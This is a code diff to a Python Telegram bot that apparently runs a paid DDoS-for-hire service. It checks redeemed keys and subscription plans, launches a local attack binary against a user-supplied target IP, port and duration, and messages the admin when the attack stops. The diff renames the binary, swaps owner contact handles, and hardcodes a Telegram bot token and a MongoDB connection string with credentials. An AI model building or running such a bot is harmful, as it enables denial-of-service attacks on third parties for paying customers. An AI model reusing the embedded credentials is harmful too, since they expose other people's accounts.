@@ -1,6 +1,5 @@
 import os
 import telebot
-import time
 import logging
 import random
 import asyncio
@@ -10,15 +9,15 @@ from threading import Thread
 from pymongo import MongoClient
 
 # Configuration
-TOKEN = '7831614064:AAHfRsn63Lladwtik3IJdDQGYOl2XDXeT7g'
-ADMIN_USER_ID = 6103581760
+TOKEN = '8186143877:AAEQmDiMSUBoGvL1U0WezZSENovh4BQ7m0Q'
+ADMIN_USER_ID = 5616232839
 MONGO_URI = 'mongodb+srv://Magic:Spike@cluster0.fa68l.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'  # Update with your MongoDB URI
 
 logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)
 
 # Initialize MongoDB Client
 client = MongoClient(MONGO_URI)
-db = client['your_databaseop']
+db = client['your_database_name']
 keys_collection = db['keys']
 users_collection = db['users']
 
@@ -57,7 +56,7 @@ def redeem_key(user_id, key):
 @bot.message_handler(commands=['genkey'])
 def handle_genkey(message):
     if message.from_user.id != ADMIN_USER_ID:
-        bot.reply_to(message, "𝙊𝙉𝙇𝙔 𝙊𝙒𝙉𝙀𝙍 𝘿𝙈-> @SIDIKI_MUSTAFA_47")
+        bot.reply_to(message, "𝙊𝙉𝙇𝙔 𝙊𝙒𝙉𝙀𝙍 𝘿𝙈-> @KvnAlpha")
         return
 
     try:
@@ -90,7 +89,7 @@ async def run_attack(target_ip, target_port, duration):
     global attack_in_progress
     attack_in_progress = True
     try:
-        process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 10")
+        process = await asyncio.create_subprocess_shell(f"./pandey {target_ip} {target_port} {duration}")
         await process.communicate()
         bot.send_message(ADMIN_USER_ID, f"🛑 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 🛑\n\n𝐇𝐎𝐒𝐓-> {target_ip}\n𝐏𝐎𝐑𝐓-> {target_port}\n𝐓𝐈𝐌𝐄-> {duration}")
     except Exception as e:
@@ -107,7 +106,7 @@ def handle_attack(message):
 
     user_data = users_collection.find_one({"user_id": user_id})
     if not user_data or user_data.get('plan', 0) == 0:
-        bot.reply_to(message, "𝘿𝙈-> @SIDIKI_MUSTAFA_47")
+        bot.reply_to(message, "𝘿𝙈-> @KvnAlpha")
         return
 
     try:
@@ -148,7 +147,7 @@ def handle_text(message):
         else:
             bot.reply_to(message, "🔑 NO ACCOUNT")
     elif message.text == "HELP 🆘":
-        bot.reply_to(message, "𝘿𝙈-> @SIDIKI_MUSTAFA_47") 
+        bot.reply_to(message, "𝘿𝙈-> @KvnAlpha")
     else:
         bot.reply_to(message, "Invalid option.")
 
